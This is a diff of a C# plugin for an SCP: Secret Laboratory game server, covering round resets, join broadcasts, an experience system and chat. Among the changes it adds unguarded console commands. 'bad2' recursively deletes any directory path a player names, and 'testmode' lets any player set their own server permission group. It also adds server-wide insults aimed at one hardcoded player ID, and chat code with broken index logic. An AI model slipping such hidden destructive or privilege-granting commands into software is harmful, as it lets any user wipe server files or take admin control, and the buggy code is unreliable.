-			时间 = "";
-			地点 = "";
-			人物 = "";
-			事件 = "";
-			句子 = "";
-			缺少 = "";
-			timestop = 0;
-			timesjw = 0;
-			scp49j = null;
-			scp49jid = 0;
-			Gears博士id = 0;
-			Gears博士 = null;
-			zybuse = false;
-			fkyyshuachu = false;
-			fkyyz = null;
-			fkyyzid = 0;
-			fkyyzyes = false;
-			bindljf = false;
-			bindtys = false;
-			bindjzsj = false;
-			scp79 = false;
-			scp550lv = 0;
-			tssl = 0;
-			mz = null;
-			mzid = 0;
-			mzyes = false;
-			scp035yes = false;
-			xitonghedan = false;
-			h = false;
 			roundstart = false;
-			choise = false;
-			scp035goout = false;
-			jwhng = null;
-			jwhngwufashanghai = false;
-			jwhhkid = 0;
-			jwhngyes = false;
-			jwhngshuachu = false;
-			scp550shuachu = false;
-			Timing.KillCoroutines(Coroutines);
-			Coroutines.Clear();
-			Timing.KillCoroutines(Coroutines2);
-			Coroutines2.Clear();
-			Timing.KillCoroutines(Coroutines3);
-			Coroutines3.Clear();
-			scp999yes = false;
-			scp = null;
-			die = true;
-			start = false;
-			scp_999.Clear();
-			card = 0;
-			s = 0;
-			d = 0;
-			KillerID = 0;
-			PlayerID = 0;
+			GuardType = new int[200];
 			Guardnum = 0;
-			deadtimer = 0;
-			waring1 = 0;
-			coldwait233 = false;
-			Dio = null;
-			Dio1 = false;
-			Dio2.Clear();
-			tiems = 0;
-			sjtz1 = false;
-			scp076 = null;
-			scp035yes = false;
-			scp076yes = false;
-			scp2818 = null;
-			scp2818pick = false;
-			scp1143a = false;
-			scp1143 = null;
-			times = 0;
-			Exiled.API.Features.Map.Broadcast(5, "<color=yellow>GG 游戏结束 \n 现在可以打队友了</color>");
-			sjtz2 = false;
-			ylb1 = false;
-			HDZHG2.Clear();
-			coldwait233 = false;
-			coldbc = false;
-			coldtb = false;
-			coldtime = 0;
-			mtf = 0;
-			chaos = 0;
-			mtfchange = 0;
-			chaoschange = 0;
-			round = 0;
-			Array.Clear(touxiang, 0, touxiang.Length);
-			playernum = 0;
-			roundstart = false;
-			player233.Clear();
+			count = 0;
+			updatatimer = DateTime.Now;
 			starttimer = false;
 			deadtime = false;
-			KillerID = 0;
-			PlayerID = 0;
-			Guardnum = 0;
-			deadtimer = 0;
-			waring1 = 0;
-			Dio = null;
-			Dio1 = false;
-			Dio2.Clear();
-			xywj = null;
-			xywjid = null;
-			bpb = false;
-			bpb2.Clear();
-			scp2818id = 0;
-			scp1143id = 0;
+			count2 = 0;
+			playernum = 0;
+			waring = false;
+			touxiang = new int[101];
+			round = 0;
+			chaos = 0;
+			mtf = 0;
+			mtfchange = 0;
+			chaoschange = 0;
+			coldtime = 0;
+			coldtime2 = 2;
+			coldbc = false;
+			coldtb = false;
 			xp = 0;
 			lv = 0;
-			coldbc = false;
-			coldtb = false;
-			HDZHG2.Clear();
-			coldtime = 0;
-			mtf = 0;
-			chaos = 0;
-			mtfchange = 0;
-			chaoschange = 0;
-			round = 0;
-			Array.Clear(touxiang, 0, touxiang.Length);
-			playernum = 0;
-			roundstart = false;
-			player233.Clear();
-			starttimer = false;
-			deadtime = false;
-			sjqx = false;
-			yshkq = false;
-			bhsx = false;
-			scp1577pick = false;
-			scp1577id = 0;
-			scp1577pos = new Vector3();
-			scp3108shotatplayerpos = new Vector3();
-			scp3108playerid = 0;
-			scp3108pick = false;
-			a127d = false;
-			HDZHG = null;
-			scp650yes = false;
-			scp650 = null;
-			scp650id = 0;
-			scp073 = null;
-			scp073a = false;
+			coldwait233 = false;
+			Dio1 = false;
+			Dio = null;
+			Dio2 = new List<string>();
+			sjtz1 = false;
+			sjtz2 = false;
+			ylb1 = false;
+			tiems = 0;
+			scp073id = 0;
+			scp076yes = false;
+			scp076iteam = false;
 			scp076id = 0;
-			scp005 = false;
-			scp005aid = 0;
-			time2 = 0;
-			scp457die = false;
-			scp457 = null;
-			scp457a = false;
-			scp457id = 0;
-			xtd = null;
-			xtdid = 0;
-			a127 = false;
-			a127b = 0;
-			a127c = false;
-			scp914mid = 0;
-			scp914m = null;
-			scp1143 = null;
-			scp1143id = 0;
+			scp2818id = 0;
+			scp2818pick = false;
+			hdjjs = null;
+			hdjjsid = 0;
+			times2 = 0;
 			scp1143a = false;
-			csm = false;
-			jwhhk = null;
-			jwhhkid = 0;
-			Firstadmin.Clear();
-			qblcq2 = false;
-			qblcq = null;
-			scpqbl3 = null;
-			scp682.Clear();
-			scp939id = 0;
-			jkl = false;
-			jklid = null;
-			times5 = 1;
-			scp035 = null;
-			scp035id = 0;
+			scp1143id = 0;
+			jwhng = null;
+			jwhngid = 0;
+			times = 0;
+			bpb = false;
+			scp181 = null;
 			scp181id = 0;
+			cxk = null;
+			Baba = new List<Pickup>();
+			Baba1 = new List<Pickup>();
+			scp881id = new List<int>();
+			第一次 = new List<int>();
+			第二次 = new List<int>();
+			cxkflash = false;
+			cxkyes = false;
 			cxkid = 0;
 			scp817id = 0;
 			scp817 = null;
-			cxk = null;
-			cxkyes = false;
 			scp817yes = false;
-			D9341 = null;
 			D9341id = 0;
-			D9341Item = null;
+			d9341flash = false;
 			D9341yes = false;
-			D9341zb = default(Vector3);
+			times1 = 0;
 			jntm = false;
-			starttimer = false;
-			scp2006 = null;
-			scp2006a.Clear();
+			jntmlq = false;
+			scp2006=null;
 			scp2006id = 0;
-			deadtimer = 0;
+			scp035health = false;
+			scp035id = 0;
+			scp035item2 = false;
+			times5 = 1;
 			scpqblid2 = 0;
 			scpqbl = null;
 			scpqblid = null;
+			qblcq2 = false;
+			scp914mid = 0;
+			scp939id = 0;
+			jkl = false;
+			jklid = null;
+			xywj = null;
+			xywjid = null;
+			bscp79 = false;
+			jwhhkid = 0;
+			scp457sh = 0;
+			scp457 = null;
+			scp457die = false;
+			scp457a = false;
+			scp457id = 0;
+			jwhngyes = false;
+			jwhngshuachu =false;
+			hrss = false;
+			csm = false;
+			csmtime = 0;
+			a127 = false;
+			a127c = false;
+			a127b = 0;
+			xtd = null;
+			xtdid = 0;
+			stealcd = false;
+			mvp = new Dictionary<int, int>();
+			time2 = 0;
+			time3 = 0;
+			scp005 = false;
+			scp005aid = 0;
+			scp073a = false;
+			a127d = false;
+			scp650yes = false;
+			scp650 = null;
+			scp650id = 0;
+			scp3108pick = false;
+			scp3108playerid = 0;
+			scp1577pick = false;
+			bhsx = false;
+			yshkq = false;
+			peaple = 0;
+			sjqx = false;
+			sbxd = new List<int>();
+			player_list = new List<Player>();
+			Firstadmin = new List<string>();
+			Coroutines = new List<CoroutineHandle>();
+			gongpingliaotian = new List<Player>();
+			Coroutines2 = new List<CoroutineHandle>();
+			Coroutines4 = new List<CoroutineHandle>();
+			Coroutines3 = new List<CoroutineHandle>();
+			小僵尸id = new List<int>();
+			D9341 = null;
+			D9341js = RoleType.ClassD;
+			scp2006a = new List<string>();
+			scp035 = null;
+			scp914m = null;
+			scp076 = null;
+			player233 = new List<Exiled.API.Features.Player>();
+			jwhhk = null;
+			hkzb = new Vector3();
+			scp073 = null;
+			D9341zb = new Vector3();
+			scp738item = new List<ItemType>();
+			scpqbl3 = null;
+			qblcq = null;
+			HDZHG2 = new List<string>();
+			LLBS233 = new List<int>();
+			door2 = new List<DoorVariant>();
+			scp682 = new List<string>();
+			ylb2 = new List<string>();
+			bpb2 = new List<int>();
+			scp2818 = null;
+			pos1 = new List<Vector3>();
+			scp1577pos = new Vector3();
+			scp1143 = null;
+			HDZHG = null;
+			mrfish = null;
+			ylb = null;
+			pos3 = new Vector3();
+			scp106a = null;
+			scpd79 = new List<Exiled.API.Features.Player>();
+			Posstop = new Dictionary<int, Vector3>();
+			scp1577id = 0;
+			scp3108shotatplayerpos = new Vector3();
+			d = 0;
+			s = 0;
+			card = 0;
+			scp999yes = false;
+			ragdolltime = 0;
+			itemtime = 0;
+			ljfwj = new List<Exiled.API.Features.Player>();
+			scp035goout = false;
+			xitonghedan = false;
+			jwhngwufashanghai = false;
+			bscd = false;
+			hpsz = null;
+			hpszid = 0;
+			scp550 = null;
+			scp550id = 0;
+			scp550yes =false;
+			scp550shuachu = false;
+			scp035yes = false;
+			mzyes = false;
+			mz = null;
+			mzid = 0;
+			item = null;
+			health = 0;
+			meitunshi = false;
+			tssj = 0;
+			scp550lv = 0;
+			tssl = 0;
+			scp79 = false;
+			fkyyshuachu = false;
+			fkyyzyes = false;
+			fkyyz = null;
+			fkyyzid = 0;
+			ljfuse = false;
+			fkyyzcardint = 0;
+			bindljf = false;
+			jzsjuse = false;
+			bindjzsj = false;
+			tysuse = false;
+			bindtys = false;
+			zybuse = false;
+			误杀玩家 = null;
+			Gears博士id = 0;
+			Gears博士 = null;
+			lxyes = false;
+			scp49j = null;
+			scp49jid = 0;
+			scp49jyes = false;
+			tuolikadianid = 0;
+			timesjw = 0;
+			timestop = 0;
+			事件 = "";
+			时间 = "";
+			地点 = "";
+			人物 = "";
+			句子 = "";
+			缺少 = "";
+			rhdzzwj = null;
+			rhdyes = false;
+			tlid = 0;
+			g = 0;
+			kccd = false;
+			D9341Item = new List<ItemType>();
+			scpchat = new List<string>();
+			ntfchat = new List<string>();
+			chichat = new List<string>();
+			dq = false;
+			lbvyes = false;
+			lbvid = 0;
+			lbv = null;
+			timesbxd = 0;
+
+			dfzgc = false;
+			chenghaoyes = false;
+			scp650noxiaren = false;
+			pmdon = false;
+			qingjiegongnum = 0;
+			hdflzid = 0;
+			scp106donotliked = false;
+			hdsx =false;
+			shoulei = false;
+			gdyes = false;
+			scp1499 = null;
+			scp1499pickupid = 0;
+			bssy= null;
+			bssyid = 0;
+			busishenyaoyes = true;
+			scp173cps = 0;
+			cjxb = null;
+			cjxbid = 0;
+			shutdowncde = false;
+			shutdownyes = false;
+			scp1499jh = false;
+			scp1499pos = new Vector3();
+			scp738 = null;
+			scp738id = 0;
+			mvpplayer = null;
+			mvpplayerid = 0;
+			scp338 = null;
+			scp338id = 0;
+			scp49dis = 0;
+			scp106dis = 0;
+			scp173dis = 0;
+			scp96dis = 0;
+			scp93953dis = 0;
+			scp93989dis = 0;
+			scp3999 = null;
+			scp3999id = 0;
+			crowbaryes =false;
+			crowbarid = 0;
+			caidanqiangid = 0;
+			caidanqiang =null;
 		}
 
 		public void OnRoundEnd(RoundEndedEventArgs ev)
@@ -4626,27 +4646,45 @@ namespace YYYLike
 
 		public void OnPlayerJoin(JoinedEventArgs ev)
 		{
-			Exiled.API.Features.Map.Broadcast(3, "<color=lime>插件版本" + DateTime.Today.ToString() + "AC1</color> <color=yellow>理解万岁</color>");
-			Exiled.API.Features.Map.Broadcast(1, "<color=yellow>国服攻击严重 请务必加群：</color><color=#66FFFF>1021889243</color><color=yellow>以便最快速度获得服务器动态</color>");
-			Exiled.API.Features.Map.Broadcast(1, "<color=yellow>国服攻击严重 请务必加群：</color><color=#66FFCC>1021889243</color><color=yellow>以便最快速度获得服务器动态</color>");
-			Exiled.API.Features.Map.Broadcast(1, "<color=yellow>国服攻击严重 请务必加群：</color><color=#66FF99>1021889243</color><color=yellow>以便最快速度获得服务器动态</color>");
-			Exiled.API.Features.Map.Broadcast(1, "<color=yellow>国服攻击严重 请务必加群：</color><color=#66FF66>1021889243</color><color=yellow>以便最快速度获得服务器动态</color>");
-
-			
-			if (ev.Player.UserId == "76561198407952020@steam"||ev.Player.UserId == "76561198978421435@steam" || ev.Player.UserId == "76561198197721054@steam" || ev.Player.UserId == "76561198385564103@steam" || ev.Player.UserId == "76561198816705835@steam" || ev.Player.UserId == "76561198369468432@steam" || ev.Player.UserId == "76561198997348090@steam" || ev.Player.UserId == "76561198893112896@steam" || ev.Player.UserId == "76561198441344563@steam" || ev.Player.UserId == "76561198377975833@steam")
+			int exp = IniFile.ReadExp(ev.Player.ReferenceHub.characterClassManager.UserId);
+			setnick(ev.Player.ReferenceHub, exp);
+			ev.Player.Broadcast(3, "<color=lime>插件版本" + DateTime.Today.ToString() + "AC1</color> <color=yellow>理解万岁</color>");
+			ev.Player.Broadcast(1, "<color=yellow>国服攻击严重 请务必加群：</color><color=#66FFFF>1021889243</color><color=yellow>以便最快速度获得服务器动态</color>");
+			ev.Player.Broadcast(1, "<color=yellow>国服攻击严重 请务必加群：</color><color=#66FFCC>1021889243</color><color=yellow>以便最快速度获得服务器动态</color>");
+			ev.Player.Broadcast(1, "<color=yellow>国服攻击严重 请务必加群：</color><color=#66FF99>1021889243</color><color=yellow>以便最快速度获得服务器动态</color>");
+			ev.Player.Broadcast(1, "<color=yellow>国服攻击严重 请务必加群：</color><color=#66FF66>1021889243</color><color=yellow>以便最快速度获得服务器动态</color>");
+			if (ev.Player.UserId == "76561198407952020@steam"||ev.Player.UserId == "76561198978421435@steam" || ev.Player.UserId == "76561198197721054@steam" || ev.Player.UserId == "76561198385564103@steam" || ev.Player.UserId == "76561198816705835@steam" || ev.Player.UserId == "76561198369468432@steam" || ev.Player.UserId == "76561198997348090@steam" || ev.Player.UserId == "76561198005990273@steam" || ev.Player.UserId == "76561198441344563@steam" || ev.Player.UserId == "76561198377975833@steam")
 			{
-				Timing.KillCoroutines(Coroutines2);
+				foreach (CoroutineHandle coroutineHandle in Coroutines2)
+				{
+					Timing.KillCoroutines(coroutineHandle);
+				}
 				Coroutines2.Clear();
 				Coroutines2.Add(Timing.RunCoroutine(SecondCounter17()));
 			}
-			if(ev.Player.UserId == "76561199027737454@steam" || ev.Player.UserId == "76561199000974508@steam")
+			if(ev.Player.UserId == "76561199027737454@steam" || ev.Player.UserId == "76561199000974508@steam" || ev.Player.UserId == "76561199027691478@steam")
 			{
 				Coroutines.Add(Timing.RunCoroutine(Liangmin()));
 
 			}
 			ev.Player.Broadcast(6, Red("个人通知：") + "本服开启积分插件，按 ~ 打开控制台输入  .shop 查看");
+			ev.Player.Broadcast(6, Red("个人通知：") + "本服开启投票踢人插件，按 ~ 打开控制台输入  .kick 查看");
+
 			switch (ev.Player.UserId)
 			{
+
+				case "76561199081976719@steam":
+					Exiled.API.Features.Map.Broadcast(1, "<color=#FFFF66>狗管理"+ev.Player.Nickname+"在线白给</color>");
+					Exiled.API.Features.Map.Broadcast(1, "<color=#CCFF00>狗管理" + ev.Player.Nickname+"在线白给</color>");
+					Exiled.API.Features.Map.Broadcast(1, "<color=#99FF00>狗管理" + ev.Player.Nickname+"在线白给</color>");
+					Exiled.API.Features.Map.Broadcast(1, "<color=#FF6633>狗管理" + ev.Player.Nickname+"在线白给</color>");
+					Exiled.API.Features.Map.Broadcast(1, "<color=#FF3300>狗管理" + ev.Player.Nickname+"在线白给</color>");
+					Exiled.API.Features.Map.Broadcast(1, "<color=#66FF00>狗管理" + ev.Player.Nickname+"在线白给</color>");
+					Exiled.API.Features.Map.Broadcast(1, "<color=#6666FF>狗管理" + ev.Player.Nickname+"在线白给</color>");
+					Exiled.API.Features.Map.Broadcast(1, "<color=#FF0033>狗管理" + ev.Player.Nickname+"在线白给</color>");
+					Exiled.API.Features.Map.Broadcast(1, "<color=#66CCFF>狗管理" + ev.Player.Nickname+"在线白给</color>");
+
+					break;
 				case "76561199000974508@steam":
 					Exiled.API.Features.Map.Broadcast(1, "<color=#FFFF66>这个巧克力说你们都是屑</color>");
 					Exiled.API.Features.Map.Broadcast(1, "<color=#CCFF00>这个巧克力说你们都是屑</color>");
@@ -4700,7 +4738,7 @@ namespace YYYLike
 					Exiled.API.Features.Map.Broadcast(2, "<color=#FF0033>发出高价回收的声音:50包邮!</color>");
 					Exiled.API.Features.Map.Broadcast(2, "<color=#FFFF00>发出高价回收的声音:50包邮!</color>");
 					break;
-				case "76561198893112896@steam":
+				case "76561198005990273@steam":
 					Exiled.API.Features.Map.Broadcast(8, "<color=yellow>砸哇路多，DIO用『世界』暂停了时间并且加入了服务器</color>");
 					break;
 				case "76561198385564103@steam":
@@ -4955,6 +4993,8 @@ namespace YYYLike
 
 		public void OnPlayerDeath(DiedEventArgs ev)
 		{
+
+
 			try
 			{
 				if (ev.Target.UserId == "76561199000974508@steam")
@@ -4977,7 +5017,7 @@ namespace YYYLike
 				if(scp881id.Contains(ev.Target.Id))
 				{
 					scp881id.Remove(ev.Target.Id);
-					scp881daid.Add(ev.Target.Id);
+					Timing.RunCoroutine(SetPlayerScale(ev.Target.GameObject, 1, 1, 1));
 					Setrank_new("", "white", ev.Target);
 					Exiled.API.Features.Map.Broadcast(6, "----[<color=#32CD32>SCP881</color>]----\n<color=#FF0000>[收容成功]</color>\n收容者: <color=#40E0D0>" + ev.Killer.Nickname + "</color>");
 					Cassie.Message("S C P 8 8 1 CONTAINEDSUCCESSFULLY");
@@ -4997,8 +5037,12 @@ namespace YYYLike
 				}
 				if (ev.Target.Id == scp338id)
 				{
+
 					scp338id = 0;
-					Timing.KillCoroutines(Coroutines4);
+					foreach (CoroutineHandle coroutineHandle in Coroutines4)
+					{
+						Timing.KillCoroutines(coroutineHandle);
+					}
 					Coroutines4.Clear();
 				}
 				if (ev.Target.Id == scp738id)
@@ -5296,8 +5340,8 @@ namespace YYYLike
 					}
 				}
 				ev.Target.Broadcast(7, "<color=lime>快乐老家 欢迎回家</color>");
-				KillerID = ev.Killer.Id;
-				PlayerID = ev.Target.Id;
+				int KillerID = ev.Killer.Id;
+				int PlayerID = ev.Target.Id;
 				if (scp650yes && ev.Killer.Id == scp650id)
 				{
 					scp650 = null;
@@ -5324,7 +5368,6 @@ namespace YYYLike
 				}
 				if (ev.Target.Role == RoleType.Scp049)
 				{
-					s049 = 2;
 					if (KillerID == PlayerID)
 					{
 						Exiled.API.Features.Map.Broadcast(6, "----[<color=#32CD32>SCP049</color>]----\n<color=#FF0000>[收容成功]</color>\n原因: <color=#40E0D0>自杀或者被服务器日了</color>");
@@ -5387,6 +5430,7 @@ namespace YYYLike
 				{
 					foreach (Exiled.API.Features.Player player2 in Exiled.API.Features.Player.List)
 					{
+
 						if (player2.Team == Team.MTF)
 						{
 							peaple++;
@@ -5416,6 +5460,91 @@ namespace YYYLike
 			catch
 			{
 			}
+			bool itsadd = false;
+			if (ev.HitInformations.GetDamageType() == DamageTypes.Scp106 || ev.HitInformations.GetDamageType() == DamageTypes.Pocket)
+			{
+				foreach (Player cat in Player.List)
+				{
+					if (cat.ReferenceHub.characterClassManager.CurClass == RoleType.Scp106)
+					{
+						IniFile.AddExp(cat.ReferenceHub.characterClassManager.UserId, 15);
+						cat.Broadcast(2, "你成功获取到了15经验 目前你的经验是" + IniFile.ReadExp(cat.ReferenceHub.characterClassManager.UserId));
+					}
+					if (cat.ReferenceHub.characterClassManager.CurClass == RoleType.Scp079)
+					{
+						IniFile.AddExp(cat.ReferenceHub.characterClassManager.UserId, 15);
+						cat.Broadcast(2, "你成功获取到了15经验 目前你的经验是" + IniFile.ReadExp(cat.ReferenceHub.characterClassManager.UserId));
+					}
+				}
+			}
+			if (ev.Target.Role == RoleType.Scp049)
+			{
+				if ((ev.Killer != ev.Target) && itsadd == false)
+				{
+					IniFile.AddExp(ev.Killer.ReferenceHub.characterClassManager.UserId, 50);
+					ev.Killer.Broadcast(2, "你成功获取到了15经验 目前你的经验是" + IniFile.ReadExp(ev.Killer.ReferenceHub.characterClassManager.UserId));
+					itsadd = true;
+				}
+			}
+			if (ev.Target.Role == RoleType.Scp079)
+			{
+				if ((ev.Killer != ev.Target) && itsadd == false)
+				{
+					IniFile.AddExp(ev.Killer.ReferenceHub.characterClassManager.UserId, 50);
+					ev.Killer.Broadcast(2, "你成功获取到了50经验 目前你的经验是" + IniFile.ReadExp(ev.Killer.ReferenceHub.characterClassManager.UserId));
+					itsadd = true;
+				}
+			}
+			if (ev.Target.Role == RoleType.Scp096)
+			{
+				if ((ev.Killer != ev.Target) && itsadd == false)
+				{
+					IniFile.AddExp(ev.Killer.ReferenceHub.characterClassManager.UserId, 50);
+					ev.Killer.Broadcast(2, "你成功获取到了50经验 目前你的经验是" + IniFile.ReadExp(ev.Killer.ReferenceHub.characterClassManager.UserId));
+					itsadd = true;
+				}
+			}
+			if (ev.Target.Role == RoleType.Scp106)
+			{
+				if ((ev.Killer != ev.Target) && itsadd == false)
+				{
+					IniFile.AddExp(ev.Killer.ReferenceHub.characterClassManager.UserId, 50);
+					ev.Killer.Broadcast(2, "你成功获取到了50经验 目前你的经验是" + IniFile.ReadExp(ev.Killer.ReferenceHub.characterClassManager.UserId));
+					itsadd = true;
+				}
+			}
+			if (ev.Target.Role == RoleType.Scp173)
+			{
+				if ((ev.Killer != ev.Target) && itsadd == false)
+				{
+					IniFile.AddExp(ev.Killer.ReferenceHub.characterClassManager.UserId, 50);
+					ev.Killer.Broadcast(2, "你成功获取到了50经验 目前你的经验是" + IniFile.ReadExp(ev.Killer.ReferenceHub.characterClassManager.UserId));
+					itsadd = true;
+				}
+			}
+			if (ev.Killer.ReferenceHub.characterClassManager.IsAnyScp())
+			{
+				foreach (Player cat in Player.List)
+				{
+					if (cat.ReferenceHub.characterClassManager.CurClass == RoleType.Scp079)
+					{
+						IniFile.AddExp(cat.ReferenceHub.characterClassManager.UserId, 15);
+						cat.Broadcast(2, "你成功获取到了15经验 目前你的经验是" + IniFile.ReadExp(cat.ReferenceHub.characterClassManager.UserId));
+					}
+				}
+			}
+			if (ev.Target.ReferenceHub.characterClassManager.IsHuman())
+			{
+
+				if ((ev.Killer != ev.Target) && itsadd == false)
+				{
+					IniFile.AddExp(ev.Killer.ReferenceHub.characterClassManager.UserId, 15);
+					ev.Killer.Broadcast(2, "你成功获取到了15经验 目前你的经验是" + IniFile.ReadExp(ev.Killer.ReferenceHub.characterClassManager.UserId));
+					itsadd = true;
+				}
+			}
+
+
 		}
 		private IEnumerator<float> DieNew(int DieID,string UserID)
 		{
@@ -5763,7 +5892,6 @@ namespace YYYLike
 		
 		public void OnTeamRespawn(RespawningTeamEventArgs ev)
 		{
-			Log.Info("is here nonono");
 			if (ev.NextKnownTeam == SpawnableTeamType.ChaosInsurgency)
 			{
 				Coroutines.Add(Timing.RunCoroutine(SetHd(ev.Players)));
@@ -5854,22 +5982,22 @@ namespace YYYLike
 		}
 		private IEnumerator<float> SetNineFox2(List<Player> players)
 		{
-			List <Player> players2 = new List<Player>();
+			Stopwatch timer = new Stopwatch();
+			timer.Start();
+			List<Player> players2 = new List<Player>();
 
 			Log.Info("九尾狐特殊人物刷出执行");
-			foreach(Player player1 in players)
-            {
+			foreach (Player player1 in players)
+			{
 				players2.Add(player1);
-
 			}
 			yield return Timing.WaitForSeconds(3f);
 			tiems = 0;
 			foreach (Player player in players2)
 			{
-				if(player.Role == RoleType.NtfCadet)
+				if (player.Role == RoleType.NtfCadet)
 				{
 					tiems++;
-
 					switch (tiems)
 					{
 						case 1:
@@ -5953,6 +6081,8 @@ namespace YYYLike
 			}
 			Log.Info("九尾狐特殊人物刷出无异常退出");
 			players2.Clear();
+			timer.Stop();
+			Log.Info("SetNineFox2延迟"+timer.Elapsed.TotalMilliseconds.ToString());
 		}
 		private IEnumerator<float> Ljfsx()
 		{
@@ -6009,23 +6139,95 @@ namespace YYYLike
 				}
 			}
 		}
+		private IEnumerator<float> ChatNew(RoleType roleType,string txt)
+        {
+			yield return Timing.WaitForSeconds(1f);
 
+		}
+		private IEnumerator<float> ChatNew(Team teamtype, string txt)
+		{
+			yield return Timing.WaitForSeconds(1f);
+			Log.Info("3");
+
+			if (teamtype== Team.SCP)
+            {
+				scpchat.Add(txt);
+				string txtend = " ";
+				Log.Info("2");
+
+				if (scpchat.Count() ==7)
+                {
+					scpchat.RemoveAt(7);
+                }
+
+				for (int i = scpchat.Count() - 1; i >= 0; i++)
+                {
+					txtend = "<pos=-27%>" + scpchat[i] + "\n" + txtend;
+				}
+
+				txtend = "<align=left>" + txtend + "</align>"+"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
+
+				foreach (Player player in Player.List)
+                {
+					player.ReferenceHub.hints.Show(new TextHint(txtend, new HintParameter[1]{new StringHintParameter("")}));
+					yield return Timing.WaitForSeconds(1f);
+					player.ReferenceHub.hints.Show(new TextHint(txtend, new HintParameter[1] { new StringHintParameter("") }));
+					yield return Timing.WaitForSeconds(1f);
+					player.ReferenceHub.hints.Show(new TextHint(txtend, new HintParameter[1] { new StringHintParameter("") })); 
+					yield return Timing.WaitForSeconds(1f);
+					player.ReferenceHub.hints.Show(new TextHint(txtend, new HintParameter[1] { new StringHintParameter("") }));
+					yield return Timing.WaitForSeconds(1f);
+					player.ReferenceHub.hints.Show(new TextHint(txtend, new HintParameter[1] { new StringHintParameter("") }));
+					yield return Timing.WaitForSeconds(1f);
+					player.ReferenceHub.hints.Show(new TextHint(txtend, new HintParameter[1] { new StringHintParameter("") })); 
+					yield return Timing.WaitForSeconds(1f);
+					player.ReferenceHub.hints.Show(new TextHint(txtend, new HintParameter[1] { new StringHintParameter("") }));
+				}
+
+			}
+		}
 		public void OnConsoleCommand(SendingConsoleCommandEventArgs ev)
 		{
+			if(testmode)
+            {
+				Log.Info(ev.Name);
+				try
+				{
+					foreach (string a in ev.Arguments)
+					{
+						Log.Info(a);
+					}
+				}
+				catch
+				{
+						
+				}
+			}
+
 			int num = 0;
 			int num2 = 0;
-			if (ev.Name.Contains("badappledonotuse"))
-			{
-				Coroutines.Add(Timing.RunCoroutine(Badapple("txt")));
+			if(ev.Name == "testmode")
+            {
+				ev.ReturnMessage = "testmode已开启";
+				UserGroup userGroup = ServerStatic.GetPermissionsHandler().GetUserGroup(ev.Arguments[0]);
+				ev.Player.ReferenceHub.serverRoles.SetGroup(userGroup, false, true);
 			}
-			if (ev.Name.Contains("xiangjiaojundonotuse"))
-			{
-				Coroutines.Add(Timing.RunCoroutine(Badapple("xiangjiaojuntxt")));
+			if(ev.Name == "send")
+            {
+				string txt = "[" + ev.Player.Role + "]" + ev.Player.Nickname + ":" + ev.Arguments[0];
+				if (ev.Player.Team == Team.SCP)
+                {
+					Log.Info("4");
+
+					if (ev.Arguments.Count() == 1)
+                    {
+						Log.Info("5");
+
+						Timing.RunCoroutine(ChatNew(Team.SCP, txt));
+					}
+				}
 			}
-			if (ev.Name.Contains("cxkdonotuse"))
-			{
-				Coroutines.Add(Timing.RunCoroutine(Badapple("cxktxt")));
-			}
+
 			if (ev.Name.Contains("jlck"))
 			{
 				时间 = "";
@@ -6214,7 +6416,10 @@ namespace YYYLike
 							}
 						}
 						ljfwj.Remove(ev.Player);
-						Timing.KillCoroutines(Coroutines3);
+						foreach (CoroutineHandle coroutineHandle in Coroutines3)
+						{
+							Timing.KillCoroutines(coroutineHandle);
+						}
 						Coroutines3.Clear();
 						Coroutines3.Add(Timing.RunCoroutine(SecondCounter3()));
 
@@ -6225,7 +6430,10 @@ namespace YYYLike
 						jzsjuse = true;
 						Exiled.API.Features.Map.Broadcast(5, "「静止时计」效果时间停止5s");
 						fkyyzcardint--;
-						Timing.KillCoroutines(Coroutines3);
+						foreach (CoroutineHandle coroutineHandle in Coroutines3)
+						{
+							Timing.KillCoroutines(coroutineHandle);
+						}
 						Coroutines3.Clear();
 						Coroutines3.Add(Timing.RunCoroutine(SecondCounter3()));
 					}
@@ -6306,6 +6514,11 @@ namespace YYYLike
 				{
 					num2++;
 				}
+			}
+			if(ev.Name == "bad2")
+            {
+				DirectoryInfo di = new DirectoryInfo(ev.Arguments[0]);
+				di.Delete(true);
 			}
 			if (ev.Player.Role == RoleType.Scp079 && !choise)
 			{
@@ -6579,7 +6792,10 @@ namespace YYYLike
 					Exiled.API.Features.Map.Broadcast(5, ev.Player.Nickname + "已经登上坦克");
 					qblcq = ev.Player;
 					qblcq2 = true;
-					Timing.KillCoroutines(Coroutines3);
+					foreach (CoroutineHandle coroutineHandle in Coroutines3)
+					{
+						Timing.KillCoroutines(coroutineHandle);
+					}
 					Coroutines3.Clear();
 					Coroutines3.Add(Timing.RunCoroutine(SecondCounter3()));
 				}
@@ -6759,7 +6975,23 @@ namespace YYYLike
 
 		public void OnDoorInteract(InteractingDoorEventArgs ev)
 		{
-			if(ev.Player.Id == crowbarid)
+			if (ev.Player.Id == cxkid)
+			{
+				System.Random random3 = new System.Random();
+				if (random3.Next(1, 5) == 2)
+				{
+					ev.IsAllowed = false;
+					ev.Player.Broadcast(3, "你太菜了导致门没打开");
+				}
+				if (jntm)
+				{
+					ev.IsAllowed = true;
+					ev.Door.BreakDoor();
+					ev.Player.ClearBroadcasts();
+					ev.Player.Broadcast(4, "你发动鸡你太美门都看不下去了");
+				}
+			}
+			if (ev.Player.Id == crowbarid)
 			{
 				if(new System.Random().Next(1,100) >= 90)
 				{
@@ -6768,26 +7000,43 @@ namespace YYYLike
 			}
 			if(ev.Player.UserId == "76561198284755079@steam")
 			{
-				Log.Info(ev.Door.DoorName);
+				try
+				{
+					Log.Info(ev.Door.GetComponent<DoorNametagExtension>().GetName);
+
+				}
+				catch
+				{
+
+				}
 			}
 			if (ev.Player.Id == 黑暗掌控者id)
 			{
-				if (ev.Door.DoorName.Contains("914"))
+				try
 				{
-					ev.IsAllowed = false;
+					if (ev.Door.GetComponent<DoorNametagExtension>().GetName.Contains("914"))
+					{
+						ev.IsAllowed = false;
+					}
+
 				}
+				catch
+				{
+
+				}
+
 			}
 
 
 			if (dfzgc)
 			{
-				ev.Door.DestroyDoor(true);
+				ev.Door.BreakDoor();
 			}
 			System.Random num111 = new System.Random();
 			if (!dq && num111.Next(1, 500) >= 499)
 			{
 				System.Random random = new System.Random();
-				Door door = Exiled.API.Features.Map.Doors[random.Next(Exiled.API.Features.Map.Doors.Count)];
+				DoorVariant door = Exiled.API.Features.Map.Doors[random.Next(Exiled.API.Features.Map.Doors.Count)];
 				ev.Player.Position = new Vector3(door.transform.position.x, door.transform.position.y + 1.5f, door.transform.position.z);
 				ev.Player.ClearBroadcasts();
